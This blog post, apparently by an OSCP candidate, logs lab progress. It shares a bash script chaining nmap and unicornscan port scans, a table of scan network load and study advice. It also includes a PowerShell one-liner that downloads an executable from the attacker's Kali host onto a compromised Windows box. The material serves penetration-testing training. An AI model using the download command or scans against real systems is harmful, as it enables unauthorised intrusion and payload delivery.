---
id: 363
title: OSCP Journey Part 9
date: 2018-08-09T09:50:04+01:00
author: rowbot
layout: post
guid: http://offsecnewbie.com/?p=363
permalink: /2018/08/09/oscp-journey-part-9/
image: /wp-content/uploads/2018/06/perfexion_logo.png
categories:
  - Progress Bar
---
 

<pre class="wp-block-preformatted">Day: -44
PDF: 90%
Videos: 95%
Boxes: 7
Networks:1</pre>

So seven boxes down currently have low priv on the 8th &#8211; have spent approx 4 days getting low priv thanks to a sneak port choice. Took a break yesterday from the box to work on an initial scan script that would pick up something like that in future. I would have a lot more boxes completed if I could use metasploit! But I can&#8217;t rely on it in the exam so I&#8217;m not using it in the lab (other than mutli/handler and using the payloads listed in my previous post).

<pre class="wp-block-preformatted">#!/bin/bash<br />if [[ -z "$1" ]]; then<br />        echo "USAGE: ./scanner.sh [IP ADDRESS}"<br />        exit 1<br />fi<br />ip=$1<br /><br />echo ---------HAVE YOU BOUNCED THE BOX??----------------<br />echo FAST NMAP SCAN OF $ip 100 PORTS<br />nmap $ip -F -oN quick$ip<br /><br />echo TCP NMAP SCAN ALL PORTS OF $ip<br />echo if this takes longer than 10 mins re run scan. Possibly restart box.<br />nmap $ip -p- -sT -oN tcpall$ip -T4 <br /><br />echo UNICORN SCAN OF ALL PORTS <br />unicornscan $ip:a > uniall$ip<br />echo <br />echo EXTRACTING PORTS FROM quick$ip and tcpall$ip<br />cat quick$ip tcpall$ip | grep open | cut -d" " -f1 | sort -u<br />echo<br />echo VIEWING uniall$ip<br />cat uniall$ip
</pre>

Let me know if you use it/find it useful/suggest ways to improve it.

Even though the Nmap book says -sS scans are quicker, I&#8217;ve found this not to be the case, -sT scans have been quicker for me.

The script gives you a quick scan of the 100 most common ports and outputs that so you can begin working on a box, ie its found a web-server, while the -sT can is running go view the web page etc. The -sT scan run a -T4 has been the most reliable in testing, -T5 has missed ports and T3 (which is the normal scan when you run nmap) is a bit too slow &#8211; though very reliable. The unicorn scan is a quick check of the other 2 scans, as its always good to use a different tool to verify findings.

Now I&#8217;m sure there are ways to improve this script as its very basic but so far its been quite solid for me. The only thing I would say is that I couldn&#8217;t figure out how to grep the output of unicornscan.

Some interesting nmap scan stats about scans I&#8217;ve put together

<table class="wp-block-table">
  <tr>
    <td>
      <strong>Scan</strong>
    </td>
    
    <td>
      <strong>Network impact</strong> 
    </td>
    
    <td>
      <strong>Against /24</strong> 
    </td>
  </tr>
  
  <tr>
    <td>
      nmap –F $ip 
    </td>
    
    <td>
      0.005436MB 
    </td>
    
    <td>
      1.38MB 
    </td>
  </tr>
  
  <tr>
    <td>
      nmap &#8211;top-ports 20 $ip
    </td>
    
    <td>
      0.014MB 
    </td>
    
    <td>
      3.57MB 
    </td>
  </tr>
  
  <tr>
    <td>
      nmap –p- $ip
    </td>
    
    <td>
      2.971MB 
    </td>
    
    <td>
      757.60MB 
    </td>
  </tr>
  
  <tr>
    <td>
      Nmap –A $ip
    </td>
    
    <td>
      2.399MB 
    </td>
    
    <td>
      611.74MB 
    </td>
  </tr>
  
  <tr>
    <td>
      Nmap –p 139,443 –script=smb-vuln* $ip
    </td>
    
    <td>
      0.12MB 
    </td>
    
    <td>
      30.60MB 
    </td>
  </tr>
</table>

So really think about what scan you want to run on a network because as you can see if scanning a whole range you will definitely affect the network with the load you are putting on.

My current struggle is Windows priv esc. I&#8217;ve used windows exploit suggester but every exploit I try doesn&#8217;t work. I&#8217;m obviously not doing something correctly, or the Offsec admins have manually patched the vulnerability its suggesting.

Nice script to put files on a windows machine with powershell

<pre class="wp-block-preformatted">powershell -c "(new-object System.Net.WebClient).DownloadFile('http://kaliboxip/AFILE.exe','C:\Users\USERYOURLOGGEDINAS\Desktop\AFILE.exe')"</pre>

To those reading this who have not started or are thinking about it. Seriously take the time to explore hackthebox and vulnhub and really think about the tools your using and the exploits you&#8217;ve used. Refine your method, get very comfortable with nmap, especially the scripting engine. Learn to get stuck and fed up and want to give up &#8211; but keep at it until you pwn that box. Document what you have learned from the box &#8211; don&#8217;t think &#8216;its okay i&#8217;ll remember that&#8217;. You won&#8217;t &#8211; believe me. There as been quite a few times I&#8217;ve forgotten something and popped on to where I&#8217;ve documented it on this site as a reminder.

Lastly, I&#8217;ve booked the exam date&#8230;.and accepted my fate of not passing on this attempt. I will eventually pass this exam I have set my mind to that, I don&#8217;t care how long it will take me. 

I hope this blog helps someone who has read other blogs and how they have pwned all the boxes in 2 days (exaggeration) and passed first time.

<div class="wp-block-image">
  <figure class="aligncenter"><img src="https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2018/08/madrobot.png?w=680" alt="" class="wp-image-376" data-recalc-dims="1" /></figure>
</div>